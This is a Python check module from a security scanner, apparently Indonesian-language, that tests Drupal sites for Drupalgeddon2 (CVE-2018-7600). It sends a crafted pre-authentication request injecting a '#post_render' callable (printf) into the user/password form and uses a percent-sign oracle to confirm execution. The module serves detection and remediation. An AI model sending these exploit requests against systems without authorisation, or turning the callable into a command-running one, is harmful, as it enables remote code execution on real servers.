"""Drupal Drupalgeddon2 (CVE-2018-7600) probe — verification-first.

Masalah versi lama:
  Marker `CYBLOK_DGN2_` adalah teks LITERAL di dalam nilai parameter `#markup`.
  Server yang sekadar MEMANTULKAN markup (echo / form error / debug) memunculkan
  marker itu TANPA Form API pernah mengeksekusi callable `printf` → temuan = prediksi.
  Selain itu re-verify (`curl_active_verify`) memakai payload & signature berbeda,
  sehingga server yang BENAR rentan pun gagal "terverifikasi ulang".

Pendekatan baru — kebal refleksi, membuktikan eksekusi (lintas PHP 7/8):
  Manfaatkan transformasi `printf` terhadap `%%` → `%`. Kirim `#markup` bernilai
  `{token}%%END` (dua tanda persen). Bila `#post_render`=[`printf`] BENAR-BENAR
  dieksekusi, `printf("{token}%%END")` menghasilkan `{token}%END` (SATU persen).
  Bila hanya dipantulkan mentah, response memuat `{token}%%END` (DUA persen).
  Kedua bentuk saling-eksklusif sebagai substring, sehingga:

      executed = f"{token}%END"     # bukti printf dieksekusi
      reflected = f"{token}%%END"   # bukti refleksi mentah
      confirm  <=>  executed in body AND reflected not in body

  `token` acak unik → mustahil match insidental. Tidak memakai `%s`/`%d`, jadi tak
  memicu ArgumentCountError di PHP 8 (transformasi `%%`→`%` tak butuh argumen).

Catatan etika: tidak ada command sistem dieksekusi — hanya `printf` echo terkontrol.
"""
from __future__ import annotations

import secrets
from urllib.parse import urljoin

from cyberloka.core import Finding, HttpClient, Severity, Target
from cyberloka.core.config import ScanConfig

# {markup} diisi nilai ter-URL-encode: `{token}%25%25END` => decoded `{token}%%END`.
TARGET_TEMPLATES = [
    "/?q=user/password&name[%23post_render][]=printf"
    "&name[%23markup]={markup}&name[%23type]=markup",
    "/user/password?name[%23post_render][]=printf"
    "&name[%23markup]={markup}&name[%23type]=markup",
]
POST_DATA = "form_id=user_pass&_triggering_element_name=name"
MARKER_PREFIX = "CLKDGN"


def make_oracle() -> tuple[str, str, str]:
    """Hasilkan (markup_terkode, executed, reflected) untuk satu percobaan."""
    token = MARKER_PREFIX + secrets.token_hex(4)
    markup = f"{token}%25%25END"   # URL-encoded: %25%25 -> '%%'
    executed = f"{token}%END"      # printf: '%%' -> '%'
    reflected = f"{token}%%END"    # refleksi mentah: dua '%'
    return markup, executed, reflected


def is_executed(body: str, executed: str, reflected: str) -> bool:
    """True hanya bila printf TEREKSEKUSI (mereduksi %% -> %), bukan refleksi."""
    return executed in body and reflected not in body


def run(target: Target, config: ScanConfig) -> list[Finding]:
    findings: list[Finding] = []
    client = HttpClient(config)
    try:
        for tmpl in TARGET_TEMPLATES:
            markup, executed, reflected = make_oracle()
            url = urljoin(target.origin + "/", tmpl.format(markup=markup).lstrip("/"))
            r = client.post(url, data=POST_DATA,
                            headers={"Content-Type": "application/x-www-form-urlencoded"},
                            allow_redirects=False)
            if r is None:
                continue
            body = r.text or ""
            if is_executed(body, executed, reflected):
                findings.append(Finding(
                    module="drupalgeddon2",
                    title="Drupalgeddon2 (CVE-2018-7600) TERBUKTI — RCE pre-auth",
                    severity=Severity.CRITICAL,
                    description=(
                        "Form `user/password` Drupal 7/8 memproses array `#post_render` "
                        "yang dikontrol attacker. Callable `printf` BENAR-BENAR dieksekusi: "
                        f"response memuat hasil reduksi format `%%`→`%` (`{executed}`), "
                        f"bukan teks payload mentah (`{reflected}`). Mustahil dari refleksi "
                        "— bukti pasti eksekusi callable arbitrer = RCE pra-auth."
                    ),
                    target=url,
                    urls=[url],
                    evidence=(
                        f"POST {url} -> printf mereduksi '%%'→'%': '{executed}' MUNCUL, "
                        f"refleksi mentah '{reflected}' TIDAK ada (kebal refleksi)."
                    ),
                    cwe="CWE-94",
                    confidence="confirmed",
                    remediation=(
                        "Upgrade Drupal core ke 7.58 / 8.3.9 / 8.4.6 / 8.5.1 atau lebih "
                        "baru. Bila tidak bisa upgrade, terapkan patch SA-CORE-2018-002 "
                        "manual. Pertimbangkan WAF rule untuk pola `[#post_render]`."
                    ),
                    references=[
                        "https://www.drupal.org/sa-core-2018-002",
                        "https://nvd.nist.gov/vuln/detail/CVE-2018-7600",
                    ],
                ))
                break
    finally:
        client.close()
    return findings
